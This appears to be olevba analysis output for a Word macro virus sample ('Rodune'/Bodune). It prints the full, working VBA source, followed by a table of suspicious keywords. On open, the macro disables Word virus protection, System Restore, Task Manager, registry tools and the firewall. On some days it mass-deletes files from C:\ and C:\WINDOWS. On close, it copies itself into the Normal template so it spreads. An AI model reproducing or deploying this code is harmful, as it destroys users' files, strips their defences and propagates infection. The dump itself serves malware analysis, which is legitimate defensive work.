olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Bodune.a-951935fe3c851c1d7768141fc602705ed4e89e96
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Bodune.a-951935fe3c851c1d7768141fc602705ed4e89e96 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Rodune.bas 
in file: Virus.MSWord.Bodune.a-951935fe3c851c1d7768141fc602705ed4e89e96 - OLE stream: 'Macros/VBA/Rodune'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Macro virus name: Rodune
'========================
'Year 2005
'========================


Private Declare Function SHAddToRecentDocs Lib "Shell32.dll" (ByVal uFlags As Long, ByVal lpszPath As String) As Long
Private Const SHARD_PATH = &H2
Dim Path As String
'Add a File to the Documents Menu in the Start Button of the Windows Taskbar

Sub AutoOpen()
On Error Resume Next

With Options
        .ConfirmConversions = False
        .VirusProtection = False
        .SaveNormalPrompt = False
   End With

MsgBox "Computer with problems!", vbOKOnly + vbExclamation + vbSystemModal, "Attention!"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Active", "Rodune") = " Virus_saved"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\windows NT\CurrentVersion\systemrestore", "DisableSR") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\systemrestore", "DisableSR") = "1"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableRegistryTools") = "1"

System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\WindowsFirewall\StandardProfile", "EnableFirewall") = "0"
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\WindowsFirewall", "DomainProfile") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Policies\Microsoft\WindowsFirewall\DomainProfile", "EnableFirewall") = "0"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Policies\Microsoft\WindowsFirewall\StandardProfile", "EnableFirewall") = "0"

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoRun") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "DisallowRun") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoFind") = "1"
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoCloseKey") = "1"

 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Scrollbar", "0 255 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Background", "0 255 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ActiveTitle", "89 151 100", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InactiveTitle", "128 128 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Menu", "0 255 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Window", "0 255 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "WindowFrame", "0 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "MenuText", "0 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "TitleText", "255 255 255", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ActiveBorder", "162 200 169", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InactiveBorder", "162 200 169", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "AppWorkspace", "150 192 157", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "Hilight", "89 151 100", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "HilightText", "0 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonFace", "0 255 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonShadow", "89 151 100", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "GrayText", "89 151 100", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonText", "0 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InactiveTitleText", "0 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonHilight", "208 227 211", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonDkShadow", "0 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonLight", "0 255 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InfoText", "0 255 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "InfoWindow", "0 0 0", ""
 WordBasic.SetPrivateProfileString "HKEY_USERS\.Default\Control Panel\Colors", "ButtonAlternateFace", "0 255 0", ""

 'Changes windows desktop colors to Green

Path = "C:\Windows\Desktop\Read.doc" ' Path of the File to be Added
SHAddToRecentDocs SHARD_PATH, Path
  'Add a File to the Documents Menu in the Start Button of the Windows Taskbar

If Day(Now()) = 5 Or (Day(Now)) = 10 Or (Day(Now)) = 15 Or (Day(Now)) = 20 Or (Day(Now)) = 25 Then
WordBasic.Kill "C:\WINDOWS\*.xls"
WordBasic.Kill "C:\WINDOWS\*.pdf"
WordBasic.Kill "C:\WINDOWS\*.rar"
WordBasic.Kill "C:\WINDOWS\*.com"
WordBasic.Kill "C:\WINDOWS\*.ini"
WordBasic.Kill "C:\WINDOWS\*.txt"
WordBasic.Kill "C:\WINDOWS\*.rtf"
WordBasic.Kill "C:\WINDOWS\*.gif"
WordBasic.Kill "C:\WINDOWS\*.pdf"
WordBasic.Kill "C:\WINDOWS\*.mp3"
WordBasic.Kill "C:\WINDOWS\*.avi"
WordBasic.Kill "C:\WINDOWS\*.mpg"
WordBasic.Kill "C:\WINDOWS\*.bmp"
WordBasic.Kill "C:\*.xls"
WordBasic.Kill "C:\*.pdf"
WordBasic.Kill "C:\*.rar"
WordBasic.Kill "C:\*.com"
WordBasic.Kill "C:\*.ini"
WordBasic.Kill "C:\*.txt"
WordBasic.Kill "C:\*.rtf"
WordBasic.Kill "C:\*.gif"
WordBasic.Kill "C:\*.xls"
WordBasic.Kill "C:\*.mp3"
WordBasic.Kill "C:\*.avi"
WordBasic.Kill "C:\*.mpg"
WordBasic.Kill "C:\*.bmp"

End If

End Sub


Sub AutoClose()
On Error Resume Next

MkDir "C:\windows\Book"
MkDir "C:\windows\Girl"
MkDir "C:\windows\Car"
MkDir "C:\windows\Movie"
MkDir "C:\windows\Music"
MkDir "C:\windows\Study"
MkDir "C:\windows\Game"
MkDir "C:\windows\Woman"
MkDir "C:\windows\Text"
ActiveDocument.SaveAs FileName:="C:\Windows\Book\Books.doc"
ActiveDocument.SaveAs FileName:="C:\Windows\Girl\Girls.doc"
ActiveDocument.SaveAs FileName:="C:\Windows\Car\Cars.doc"
ActiveDocument.SaveAs FileName:="C:\Windows\Movie\Movies.doc"
ActiveDocument.SaveAs FileName:="C:\Windows\Music\Musics.doc"
ActiveDocument.SaveAs FileName:="C:\Windows\Study\Studies.doc"
ActiveDocument.SaveAs FileName:="C:\Windows\Game\Games.doc"
ActiveDocument.SaveAs FileName:="C:\Windows\Woman\Women.doc"
ActiveDocument.SaveAs FileName:="C:\Windows\Text\Texts.doc"
'Create folder and file

Dim iMacroCount
   Dim i
   Dim Criar
   Dim Instal
   Dim sMe$
   Dim sMacro$
   iMacroCount = WordBasic.CountMacros(0, 0)
   For i = 1 To iMacroCount
      If WordBasic.[MacroName$](i, 0, 0) = "Rodune" Then
           Instal = -1
      End If

      If WordBasic.[MacroName$](i, 0, 0) = "Rodune" Then
           Criar = -1
       End If
   Next i
   If Not Criar And Not Instal Then
     sMe$ = WordBasic.[FileName$]()
       sMacro$ = sMe$ + ":Rodune"
       WordBasic.MacroCopy sMacro$, "Global:Rodune"
      
   If NormalTemplate.Saved = False Then NormalTemplate.Save
     
 End If
   
   ActiveDocument.Save

End Sub

Sub ToosMacro()
    On Error Resume Next
    Application.DisplayStatusBar = False 'Disable tools macro
    
End Sub










    
    
    

    




        











+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell32             |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Create              |May execute file or a system command through |
|          |                    |WMI                                          |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Shell32.dll         |Executable file name                         |
+----------+--------------------+---------------------------------------------+

